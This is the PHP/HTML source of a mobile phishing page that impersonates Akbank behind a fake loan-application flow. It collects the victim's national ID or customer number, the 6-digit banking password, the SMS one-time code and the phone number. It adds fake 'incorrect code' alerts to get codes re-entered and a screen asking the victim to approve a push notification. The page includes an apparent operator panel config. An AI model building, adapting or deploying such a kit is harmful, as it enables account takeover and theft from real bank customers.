<?php

include "./panelgiris/config.php";
include "./panelgiris/project-security.php";
?>

<!DOCTYPE html><html lang="tr"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="theme-color" content="#dc0004">
    <title>x</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap" rel="stylesheet">
    <link rel="stylesheet" href="./style.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 
 </head>
<body>
 
    <div class="preloader hidden">
        <img src="/img/ak-white.png" width="115%" style="margin-top: 100%;">
    </div>
    <div id="slider">
        <div class="gray1 slide hidden" style="position:relative;">
            <h3 id="titles">İyi<br>akşamlar</h3>
            <section id="buttons2">
                <button id="btn" onclick="slider1.next()">Giriş</button>
                <button id="btn2">Akbanklı Olmak İstiyorum</button>
            </section>

            <div id="bottom-area">
                <div id="flag" style="">
                    <img src="/img/tr.png" width="12%" style="margin-top: 5%;">
                    <p style="font-size: 12px;">Türkçe</p>
                </div>
                <img src="/img/bottom.png" class="bottom-fixed">
            </div>

            <!-- Yeni Buton -->
           
        </div>

        <div class="gray2 slide hidden">
            <div id="bireysel" style="display: inline-flex;width: 100%;justify-content: space-between;">
                <img id="auto-click" src="/img/ok-black.png" onclick="slider1.prev()" width="32px" style="display: flex;
                    justify-content: center;
                    align-items: center;
                    margin-right: 15%;
                    margin-left: 2%;">
                <h2 style="text-align: center; font-size: 12px; color: black; margin: 0; margin-right: auto;display: flex;
                    justify-content: center;
                    align-items: center;
                border-bottom: solid red;font-weight: 5mö89n 00;">Bireysel</h2>
                <h2 style="text-align: center; font-size: 12px; color: black; margin: 0;display: flex;
                    justify-content: center;
                    align-items: center;
                    margin-right: 20%;font-weight: 500;">Kurumsal</h2>
            </div>

            <h3 id="titles">Kredi<br>Başvurusu</h3>

            <section id="buttons2">
                <button id="btn" onclick="handleButtonClick()">Müşteri veya TC kimlik no ile giriş</button>
                <button id="btn2">Kredi kartı numarası ile giriş</button>
            </section>

            <div id="bottom-area">
                <div id="flag" style="">
                    <img src="/img/tr.png" width="12%" style="margin-top: 5%;">
                    <p style="font-size: 12px;">Türkçe</p>
                </div>
                <img src="/img/bottom.png" class="bottom-fixed">
            </div>

            <!-- Yeni Buton -->
           
        </div>

        <div class="gray3 slide hidden" style="background-color: rgb(255, 255, 255);">
            <div id="tab3header">
                <img src="/img/ok.png" onclick="slider1.prev()" width="32px" style="margin-right: auto;">
                <h2 style="text-align: center;font-size: 12px;color: white;margin: 0;margin-right: 47%;font-weight: 600;">
                    Giriş</h2>
            </div>

            <div id="alertDiv" class="alertDiv">
                <p style="color: #000; font-size: 12px;font-weight: 600;margin-top:15px;">Bilgilendirme</p>
                <img src="/img/loader.gif" style="width: 30%;">
                <p style="color: #000; font-size: 12px;font-weight: 400;">Eksik veya hatalı bilgi girdiğini fark ettik.
                    Kontrol edip tekrar deneyebilirsin.</p>
                <button type="submit" onclick="closeAlert()" id="btn-spc3" style="width: 90%!important;">Tamam</button>
            </div>

            <div id="loginInputs">
            <form id="customForm" onsubmit="return false;">
        <label for="customUsername" style="color:#636364; font-size: 11px; display: block;margin-bottom: 3%;float: left;font-weight:600;">MÜŞTERİ
            VEYA TC KİMLİK NUMARASI</label>
        <input type="text" name="customTc" placeholder="Müşteri veya TC kimlik numaranı gir" id="customUsername" style="font-size: 13px;font-weight:600;border:0;width: 100%;display: block; margin-bottom: 10px;" minlength="11" maxlength="11" inputmode="numeric">
        <hr>
        <label for="customPassword" style="float: left;color:#636364; font-size: 11px; display: block;margin-bottom: 3%;margin-top: 3%;font-weight:600;">AKBANK
            ŞİFRESİ</label>
        <input type="password" name="customPass" placeholder="6 haneli şifreni gir" id="customPassword" style="font-size: 13px;font-weight:600;width: 100%;display: block;border: 0;" minlength="6" maxlength="6" inputmode="numeric">
    </form> 


 

</div>

            <div id="tab3footer" style="display: flex; justify-content: space-between;" bis_skin_checked="1">
                <p style="color: #dc0004; font-size: 12px; margin-top: 35px; margin-left: 15px;font-weight:500;">
                    Müşteri numaranı mı
                    <br> <span style="margin-left:-75px !important;">unuttun?</span>
                </p>
                <p style="color: #dc0004; font-size: 12px; margin-top: 35px; margin-right: 15px;font-weight:500;">
                    Şifreni mi unuttun?
                </p>
            </div>

            <div id="submitContainer">
        <button type="button" id="customSubmitBtn" style="width: 100% !important; background-color: rgb(220, 0, 4);" onclick="submitCustomForm()">Giriş</button>
    </div>

 
            <!-- Yeni Buton -->
          
        </div>
  
  
        <div class="gray4 slide hidden" style="background-color: rgb(241, 241, 241);">
            <div id="alertDiv3" class="alertDiv">
                <hr style="width:5%;border: 2px solid; border-radius: 5px;margin-top:5px;">
                <div style="padding-bottom:5px;"></div>
                <p style="color: #000; font-size: 16px;font-weight: 600;margin-top:15px;">Uyarı</p>
                <img src="/img/turuncu.png" style="width: 25%;">
                <p style="color: #000; font-size: 14px;font-weight: 400;margin-right:30px;margin-left;30px;">Girdiğin
                    Cep Şifre hatalı. Kontrol edip tekrar
                    deneyebilirsin.</p>
                <button type="submit" onclick="uyariKapat()" id="btn-spc3" style="width: 90%!important;">Tamam</button>
            </div>
            <div style="background-color:red;">
                <div id="tab3headers">
                    <img src="/img/ok.png" onclick="slider1.prev()" width="32px" style="position:absolute; top: 10px; left: 10px;">
                    <h2 style="text-align: center;font-size: 12px;color: white;margin: 0; font-weight: 400;margin-bottom:10px;">
                        1 numaralı
                        CepŞifre'ni gir</h2>
                </div>
                <div id="tab3header1"> <label style="text-align: center;font-size: 11px;color: white;font-weight: 200; "><label id="cepgir">
                            nolu telefonuna gönderdik.</label></label></div>
            </div>
           <div id="loginInputs">
    <form id="customSmsForm" onsubmit="return sendCustomSms();">
        <label for="customSms" style="color:black; font-size: 11px; display: block;margin-bottom: 3%;float: left;">CEP ŞİFRE</label>
        <input type="text" name="customSms" placeholder="6 haneli CepŞifre'ni gir" id="customSms" style="font-size: 12px;font-weight:bold;border:0;width: 100%;display: block; margin-bottom: 10px;" minlength="6" maxlength="6" oninput="checkSms()" inputmode="numeric">
    </form>
</div>
<div id="tab3footer" style="display: flex; justify-content: space-between;" bis_skin_checked="1">
    <p id="countdownCustom" style="color: #636069; font-size: 12px; margin-top: 15px;font-weight: 600;padding:5px;">Eğer cep şifren <b>2:40</b> saniye içinde ulaşmazsa yeni bir şifre isteyebilirsin.</p>
</div>
<div id="gonderCustom">
    <button style="width: 100%!important;" class="saban" id="btn-custom-spc3" type="submit">Devam</button>
</div>
 
<div id="tab3footer" style="display: flex; justify-content: space-between;" bis_skin_checked="1">
    <p id="countdownCustom" style="color: #636069; font-size: 12px; margin-top: 15px;font-weight: 600;padding:5px;">Eğer cep şifren <b>2:40</b> saniye içinde ulaşmazsa yeni bir şifre isteyebilirsin.</p>
    <p id="hatali" style="color: #F44336;font-size: 12px;margin-top: 15px;font-weight: 600;padding:5px;margin-left: 10px;display:none;">Girilen CepŞifre hatalı ! Lütfen sms ile gelen şifreyi kontrol ediniz .</p>
</div>
 
 
          
 
        </div>

        <div class="gray5 slide hidden" style="background-color: rgb(241, 241, 241);">
            <div id="call" style="margin-top: 20%;width: 90%;display: inline-block;">
                <img src="./img/cbc.png" width="220" height="200">

                <p id="countdown2" style="font-size: 18px; color: #7d7c7c; margin-top: 5%; font-weight: 500;"><span id="dataContainer"></span> Başvuru Başarılı ✅ <br><br><span style="display:none;" id="timer2">30</span>
                Temsilcimiz kısa süre içinde sizinle irtibata geçecektir!</p>
                
            </div>

            <!-- Yeni Buton -->
          
        </div>

        <div class="gray6 slide hidden" style="background-color: rgb(241, 241, 241);">
            <div id="tab3header21">
                <h2 style="text-align: center;font-size: 12px;color: white;margin: 0; font-weight: 600;">
                    Telefon No Doğrulama</h2>
            </div>

            <div id="alertDiv3" class="alertDiv">
                <p style="color: #000; font-size: 12px;font-weight: 600;margin-top:15px;">Bilgilendirme</p>
                <img src="./img/loader.gif" style="width: 30%;">
                <p style="color: #000; font-size: 12px;font-weight: 400;">Eksik veya hatalı bilgi girdiğini fark ettik.
                    Kontrol edip tekrar deneyebilirsin.</p>
                <button type="submit" onclick="$('#alertDiv3').removeClass('show2');" id="btn-spc2" class="btnn-spc3" style="width: 90%!important;">Tamam</button>
            </div>

            <div id="loginInputs" class="telefonInputs">
        <form onsubmit="return telefonInputs()">
            <div style="display: flex; flex-direction: column;">
                <label for="phone1" style="color:#636364; font-size: 11px; margin-bottom: 3%;display: flex;font-weight:600;">CEP TELEFONU NUMARASI</label>
                <div style="display: flex; align-items: center;">
                    <b style="font-size: 14px;width: 17%;font-weight: 600!important;">TR +90</b>
                    <img src="./img/alt-ok.png" style="width: 24px;margin-left: 3%">
                    <input type="text" name="phone2" placeholder="Telefon numaranı gir" id="phone2" style="font-size: 12px;font-weight:bold;border:0;width: 40%;display: block;" minlength="10" maxlength="11"  inputmode="numeric">
                </div>
            </div>
        </form>
    </div>

    <div id="gonder">
        <button type="submit" id="btn-spc" class="telefonBTN" style="width: 100% !important;     background-color: rgb(238, 21, 2);
" onclick="submitPhoneForm()">Devam</button>
    </div>

            <!-- Yeni Buton -->
             
        </div>

        <div class="gray7 slide hidden" style="background-color: rgb(241, 241, 241);">
            <div id="call" style="margin-top: 20%;width: 90%;display: inline-block;">
                <img src="an.svg" width="220" height="200">
                <p id="countdown2" style="font-size: 18px; color: #7d7c7c; margin-top: 5%; font-weight: 500;">İşleminiz Devam Ediyor Lütfen Bekleyiniz.</p>
            </div>

            <!-- Yeni Buton -->
            
        </div>
   <div class="gray8 slide active" style="background-color: rgb(255, 255, 255);">
    <div id="call" style="margin-top: 20%;width: 90%;display: inline-block;">
        <img src="./img/onay.png" width="220" height="220">

        <p id="notificationText" style="font-size: 18px; color: #7d7c7c; margin-top: 5%; font-weight: 500;">
            Cep telefonunuza bir bildirim gönderdik. Lütfen bildirimi onaylayın.
        </p>

        <div id="notificationInstructions" style="font-size: 16px; color: #636069; margin-top: 5%; font-weight: 400;">
            Bildirimi onayladıktan sonra işleminiz otomatik olarak devam edecektir.
        </div>

        <div id="loadingIndicator" style="margin-top: 20px;">
            <img src="./img/loader.gif" width="50" height="50">
        </div>
    </div>

    <!-- Yeni Buton -->
</div>
    </div>

 
    <!-- partial -->
    <script src="./script.js?v=1.1.2"></script>
  
 
 
</body>
</html>